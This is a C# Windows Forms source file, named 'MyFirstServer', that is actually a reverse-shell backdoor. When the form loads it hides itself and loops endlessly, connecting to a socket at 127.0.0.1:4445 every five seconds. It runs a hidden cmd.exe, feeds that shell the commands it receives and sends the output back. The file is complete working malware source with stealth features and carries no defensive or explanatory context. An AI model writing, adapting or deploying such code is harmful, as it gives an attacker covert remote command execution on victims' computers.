using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MyFirstServer
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for(; ;)
            {
                RunServer();
                Thread.Sleep(5000);
            }
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("127.0.0.1", 4445);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception)
                {
                    return;
                }
                ShellCmd();
            }
        }

        private void ShellCmd()
        {
            processCmd = new Process();

            processCmd.StartInfo.FileName = "cmd.exe";

            processCmd.StartInfo.CreateNoWindow = true;

            processCmd.StartInfo.UseShellExecute = false;

            processCmd.StartInfo.RedirectStandardOutput = true;

            processCmd.StartInfo.RedirectStandardInput = true;

            processCmd.StartInfo.RedirectStandardError = true;

            processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

            processCmd.Start();

            processCmd.BeginOutputReadLine();

            while (true)
            {

                try
                {

                    strInput.Append(streamReader.ReadLine());

                    strInput.Append("\n");

                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();

                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();

                    processCmd.StandardInput.WriteLine(strInput);

                    strInput.Remove(0, strInput.Length);

                }

                catch (Exception)
                {
                    CleanUp();

                    break;

                }

            }
        }
        private void CleanUp()
        {
            try
            {
                processCmd.Kill();
            }
            catch (Exception)
            {

            }
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private void StopServer()
        {
            CleanUp();
            Environment.Exit(0);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder stroutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    stroutput.Append(outLine.Data);
                    streamWriter.WriteLine(stroutput);
                    streamWriter.Flush();
                }
                catch (Exception)
                {

                }
            }


        }




    }
}
